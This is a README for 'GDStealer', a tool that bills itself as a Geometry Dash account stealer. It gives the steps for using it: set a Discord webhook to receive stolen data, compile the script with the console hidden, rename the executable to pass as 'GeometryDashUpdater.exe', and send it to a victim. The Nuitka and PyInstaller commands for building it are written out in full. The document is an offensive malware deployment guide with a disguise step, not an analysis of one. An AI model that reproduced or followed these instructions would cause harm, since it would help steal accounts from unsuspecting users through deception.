# GDStealer
Geometry Dash Account Stealer

## How to use
1. Download this git repository [here](https://github.com/Xytriza/GDStealer/archive/refs/heads/main.zip)
2. Modify "webhook_url" in GDStealer.py
3. Run `pip install discord`
4. Compile using Nuitka or PyInstaller with the hide console option
5. Rename the file to something like "GeometryDashUpdater.exe"
6. Send to your victim

## How to get the webhook url
1. Create a discord server
2. Create a webhook in your discord server
3. Copy the webhook url
4. Paste it in "webhook_url" in GDStealer.py

## Example compile commands
Nuitka:
```
nuitka --windows-disable-console --onefile GDStealer.py
```

PyInstaller:
```
pyinstaller --noconsole --onefile GDStealer.py
```